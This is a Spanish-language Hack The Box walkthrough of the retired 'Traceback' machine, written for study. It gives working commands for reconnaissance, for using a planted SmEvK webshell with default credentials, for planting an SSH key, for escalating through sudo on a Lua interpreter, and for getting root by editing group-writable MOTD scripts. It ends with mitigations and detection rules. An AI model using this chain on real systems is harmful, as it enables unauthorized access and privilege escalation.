---
machine: Traceback
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, php, webshell, sudo, lua, motd]
---

# Traceback — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El servidor solo expone SSH y un Apache con la portada desfigurada. El código fuente de la página deja una pista hacia una colección pública de webshells y una firma: `Xh4H`. Probando los nombres habituales de esa colección aparece `smevk.php`, una SmEvK v3 con **credenciales por defecto** que ejecuta comandos como `webadmin`. Con una clave SSH temporal se pasa a una sesión estable; `sudo -l` muestra que `webadmin` puede ejecutar `luvit` como `sysadmin`, y `luvit` ejecuta Lua con `os.execute`. Ya como `sysadmin`, `/etc/update-motd.d` es escribible por el grupo y lo ejecuta **root** en cada inicio de sesión SSH.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,80 -sCV -oA nmap_svc <IP>
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
|_http-title: Help us
```

- Solo dos puertos: no hay base de datos ni servicios internos que enumerar.
- La portada está desfigurada y se presenta como "hackeada".
- El nombre del autor de la desfiguración aparece en el HTML y apunta a su repositorio de webshells.

```bash
echo "<IP> traceback.htb" | sudo tee -a /etc/hosts
```

## Enumeración

Un barrido de directorios normal no encuentra nada: el `server-status` está bloqueado y no hay backups ni paneles. La pista está en el comentario del HTML, así que conviene probar nombres concretos en lugar de seguir fuzzeando:

```bash
for p in smevk.php shell.php cmd.php backdoor.php; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $p\n" "http://<IP>/$p"
done
```

`/smevk.php` responde 200 y devuelve el login de **SmEvK v3**. El script lleva las credenciales escritas en duro (`admin` / `admin`), que es lo habitual en esta colección.

Tras autenticarse, la consola envía los comandos por `POST` con `a=Console` y el comando en `p1`:

```bash
curl -s -b smevk.cookies -c smevk.cookies \
  --data-urlencode 'a=Console' \
  --data-urlencode 'c=/var/www/html/' \
  --data-urlencode 'p1=id' \
  --data-urlencode 'charset=UTF-8' \
  http://<IP>/smevk.php
```

La respuesta confirma ejecución como `webadmin`.

## Foothold

La webshell sirve para comandos sueltos, pero es incómoda para el resto de la cadena. Se instala una clave SSH propia a través de la propia consola:

```bash
ssh-keygen -t ed25519 -f traceback_ed25519 -N ''
PUBKEY=$(cat traceback_ed25519.pub)

curl -s -b smevk.cookies \
  --data-urlencode 'a=Console' \
  --data-urlencode 'c=/var/www/html/' \
  --data-urlencode "p1=mkdir -p /home/webadmin/.ssh && echo '$PUBKEY' >> /home/webadmin/.ssh/authorized_keys && chmod 700 /home/webadmin/.ssh && chmod 600 /home/webadmin/.ssh/authorized_keys" \
  --data-urlencode 'charset=UTF-8' \
  http://<IP>/smevk.php

ssh -i traceback_ed25519 webadmin@<IP>
```

Por qué funciona: la webshell ya corre como `webadmin`, así que escribe en su propio `authorized_keys` sin necesitar nada más; y el login por defecto no se había cambiado.

## Movimiento lateral

No hay un segundo equipo. El salto es de usuario en el mismo host:

```bash
sudo -l
```

```text
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

`luvit` es un runtime de Lua. Bajo `sudo` ejecuta código como `sysadmin`, y Lua tiene `os.execute`, así que el intérprete es la escalada:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("id; ls -la /home/sysadmin")'
```

Con eso se lee `user.txt` y se abre una shell interactiva como `sysadmin`:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash -i")'
```

## Escalada de privilegios

Como `sysadmin` se revisan los scripts de bienvenida:

```bash
ls -la /etc/update-motd.d/
```

El directorio es `root:sysadmin` y los scripts son escribibles por el grupo. Esos scripts los ejecuta **root** en cada inicio de sesión SSH, de modo que basta añadir una línea:

```bash
cp /etc/update-motd.d/00-header /tmp/00-header.bak
printf '\ncp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt\n' >> /etc/update-motd.d/00-header
ssh -i traceback_ed25519 webadmin@<IP> true     # dispara el MOTD como root
cat /tmp/root.txt
cp /tmp/00-header.bak /etc/update-motd.d/00-header
```

Para una shell en vez de copiar el fichero, la misma vía admite una reverse shell en la línea añadida. Restaurar el script al terminar evita dejar el sistema roto.

## Evidencia

- `curl -I` sobre `smevk.php` con el código 200, sin cookies ni credenciales.
- Salida recortada de `id` y de `sudo -l`.
- `ls -la /etc/update-motd.d/` mostrando propietario y permisos del grupo.
- Sin flags, sin la clave privada y sin el contenido de `root.txt`.

## Lecciones aprendidas

- Un comentario en el HTML puede ser la ruta prevista, no decoración: aquí valía más probar nombres conocidos que lanzar otro diccionario.
- Una webshell con credenciales por defecto es ejecución remota de comandos, aunque el resto del sitio esté "solo" desfigurado.
- `sudo` sobre un intérprete genérico (Lua, Python, Perl) equivale a ser ese usuario, aunque el binario no esté en GTFOBins con ese nombre.
- Un directorio de MOTD escribible por un grupo no root es root en el siguiente login.
- Conviene restaurar cualquier fichero del sistema que se modifique durante la escalada.

## Mitigaciones y detección

- Borrar la webshell del document root y, si se necesita, cambiar su autenticación y monitorizarla.
- No dejar credenciales por defecto en herramientas expuestas a internet.
- No conceder `sudo` a intérpretes de propósito general; si hace falta, envolver la tarea en un script con argumentos fijos.
- `/etc/update-motd.d` debe ser `root:root` y sin escritura de grupo; revisar con AIDE o similar.
- Detección: peticiones `POST` repetidas a un `.php` con parámetros `a=Console`/`p1=` en el access log, `sudo` a `luvit` en `auth.log` (con el TTY y el usuario), y cambios en `/etc/update-motd.d` (auditd `-w /etc/update-motd.d -p wa`).

MITRE: T1505.003 (web shell), T1548.003 (sudo and sudo caching), T1037.004 (RC scripts), T1078 (valid accounts).

## Referencias

- <https://www.hackthebox.com/machines/traceback>
- <https://blog.raw.pm/en/HackTheBox-Traceback-write-up>
- <https://blog.wtfender.com/posts/htb-traceback>
- <https://whitehatlab.eu/en/blog/writeup/hackthebox/machine/linux/traceback>
- <https://www.lua.org/manual/5.1/manual.html#pdf-os.execute>
